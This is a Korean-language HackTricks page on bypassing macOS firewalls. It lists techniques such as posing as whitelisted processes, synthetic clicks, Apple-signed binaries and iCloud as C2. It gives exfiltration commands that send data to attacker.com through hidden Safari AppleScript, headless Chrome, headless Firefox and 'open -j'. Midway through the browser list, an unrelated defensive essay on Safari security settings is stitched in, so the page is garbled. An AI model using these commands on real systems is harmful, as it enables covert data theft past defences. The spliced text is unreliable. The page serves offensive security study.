# macOS 방화벽 우회하기

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 상품**](https://peass.creator-spring.com)을 구매하세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **Hacking 트릭을 공유하려면 PR을** [**HackTricks**](https://github.com/carlospolop/hacktricks) **및** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github 저장소에 제출**하세요.

</details>

## 발견된 기법

다음 기법들은 일부 macOS 방화벽 앱에서 작동하는 것으로 확인되었습니다.

### 화이트리스트 이름 남용

* 예를 들어 악성 코드를 **`launchd`**와 같은 잘 알려진 macOS 프로세스 이름으로 호출합니다.

### 합성 클릭

* 방화벽이 사용자에게 허가를 요청하면 악성 코드가 **허용을 클릭**합니다.

### Apple 서명된 이진 파일 사용

* **`curl`**과 같은 이진 파일을 사용합니다. 그 외에도 **`whois`**와 같은 다른 이진 파일도 사용할 수 있습니다.

### 잘 알려진 Apple 도메인

방화벽은 **`apple.com`** 또는 **`icloud.com`**과 같은 잘 알려진 Apple 도메인으로의 연결을 허용할 수 있습니다. iCloud는 C2로 사용될 수 있습니다.

### 일반적인 우회

방화벽 우회를 시도하기 위한 몇 가지 아이디어

### 허용된 트래픽 확인

허용된 트래픽을 알면 잠재적으로 화이트리스트에 등록된 도메인이나 해당 도메인에 액세스할 수 있는 애플리케이션을 식별하는 데 도움이 됩니다.
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### DNS 남용

DNS 해석은 **`mdnsreponder`**로 서명된 애플리케이션을 통해 수행되며, DNS 서버에 연락할 수 있도록 허용될 것입니다.

<figure><img src="../../.gitbook/assets/image (1) (1) (6).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### 브라우저 앱을 통한 접근

* **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
* 구글 크롬

{% code overflow="wrap" %}
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
{% endcode %}

* 파이어폭스
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
* Safari

# Safari

Safari는 macOS 운영 체제에서 기본적으로 제공되는 웹 브라우저입니다. 이 브라우저는 macOS의 다양한 보안 기능을 활용하여 사용자의 개인 정보와 데이터를 보호합니다. 그러나 Safari를 사용하여 웹을 탐색하는 동안 여전히 보안 위협에 노출될 수 있습니다. 이 섹션에서는 Safari를 사용할 때 고려해야 할 몇 가지 보안 사항과 방어 기술을 살펴보겠습니다.

## 1. 쿠키 관리

쿠키는 웹 사이트가 사용자의 브라우저에 저장하는 작은 데이터 조각입니다. Safari는 기본적으로 쿠키를 허용하도록 설정되어 있습니다. 그러나 사용자는 쿠키를 수동으로 관리하거나 특정 웹 사이트에서 쿠키를 차단할 수 있습니다. Safari의 "개인 정보 보호" 탭에서 쿠키 관리 설정을 찾을 수 있습니다.

## 2. 확장 프로그램 관리

Safari는 확장 프로그램을 통해 브라우저 기능을 확장할 수 있습니다. 그러나 악성 확장 프로그램은 사용자의 개인 정보를 유출하거나 악용할 수 있습니다. 따라서 사용자는 신뢰할 수 있는 출처에서만 확장 프로그램을 설치해야 합니다. Safari의 "확장 프로그램" 탭에서 설치된 확장 프로그램을 관리할 수 있습니다.

## 3. 보안 업데이트

Apple은 Safari를 포함한 macOS 운영 체제의 보안 취약점을 해결하기 위해 정기적으로 보안 업데이트를 제공합니다. 사용자는 시스템 환경 설정에서 자동 업데이트를 활성화하여 최신 보안 패치를 받을 수 있습니다.

## 4. 안전한 연결

Safari는 HTTPS를 통해 웹 사이트와의 통신을 암호화합니다. 사용자는 "개인 정보 보호" 탭에서 "안전한 웹 사이트만 허용" 옵션을 활성화하여 안전한 연결을 강제할 수 있습니다.

## 5. 사이트 권한 관리

Safari는 웹 사이트에 대한 권한을 관리할 수 있는 기능을 제공합니다. 사용자는 "개인 정보 보호" 탭에서 웹 사이트에 대한 권한을 확인하고 수정할 수 있습니다. 이를 통해 사용자는 웹 사이트가 위치 정보, 카메라, 마이크 등에 접근하는 것을 제어할 수 있습니다.

## 6. 인터넷 보안 및 개인 정보 보호 소프트웨어

Safari 외에도 다양한 인터넷 보안 및 개인 정보 보호 소프트웨어를 사용하여 더욱 강력한 보안을 제공할 수 있습니다. 이러한 소프트웨어는 악성 웹 사이트, 스팸 메일, 악성 다운로드 등을 탐지하고 차단하는 기능을 제공합니다.

Safari를 사용하는 동안 이러한 보안 사항을 유지하면 개인 정보와 데이터를 보호할 수 있습니다. 그러나 완벽한 보안은 존재하지 않으므로 항상 주의가 필요합니다.
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### 프로세스 인젝션을 통한 우회

만약 **서버에 연결할 수 있는 권한을 가진 프로세스에 코드를 인젝션**할 수 있다면 방화벽 보호를 우회할 수 있습니다:

{% content-ref url="macos-proces-abuse/" %}
[macos-proces-abuse](macos-proces-abuse/)
{% endcontent-ref %}

## 참고 자료

* [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 상품**](https://peass.creator-spring.com)을 구매하세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)을 **팔로우**하세요.
* **HackTricks**와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하여 여러분의 해킹 기법을 공유하세요.

</details>
